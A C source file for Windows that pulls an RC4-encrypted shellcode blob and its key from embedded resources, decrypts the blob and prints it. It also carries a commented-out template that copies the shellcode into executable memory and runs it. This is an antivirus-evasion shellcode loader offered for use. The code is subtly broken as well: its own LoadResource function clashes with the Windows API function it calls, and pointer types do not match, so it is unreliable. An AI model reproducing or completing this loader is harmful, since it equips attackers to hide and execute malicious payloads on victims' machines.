#include <windows.h>
#include <stdio.h>
#include <string.h>


void LoadResource(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
    if (hResource == NULL) {
        printf("Resource not found!\n");
        exit(1);
    }

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}

void rc4_decrypt(unsigned char *data, int data_len, unsigned char *key, int key_len) {
    unsigned char S[256];
    int i, j = 0, k, t;

    for (i = 0; i < 256; i++) {
        S[i] = i;
    }

    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % key_len]) & 0xff;
        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }

    i = j = 0;
    for (k = 0; k < data_len; k++) {
        i = (i + 1) & 0xff;
        j = (j + S[i]) & 0xff;

        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;

        t = (S[i] + S[j]) & 0xff;
        data[k] ^= S[t];
    }
}

int main() {
    char* rc4code;
    DWORD rc4codesize;

    // Load the encrypted shellcode resource
    LoadResource("RC4CODE", &rc4code, &rc4codesize);
    
    char* rc4key;
    DWORD rc4keysize;

    // Load the encrypted shellcode resource
    LoadResource("RC4KEY", &rc4key, &rc4keysize);

    rc4_decrypt(rc4code, rc4codesize, rc4key, rc4keysize);

    printf("Decrypted shellcode:\n");
    for (int i = 0; i < rc4codesize; i++) {
        printf("\\x%02x", rc4code[i]);
    }
    printf("\n");

  /* Please use your own technique/method or logic
    LPVOID address = VirtualAlloc(NULL, rc4codesize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(address, rc4code, rc4codesize);
    ((void(*)())address)();
  */
    return 0;
}
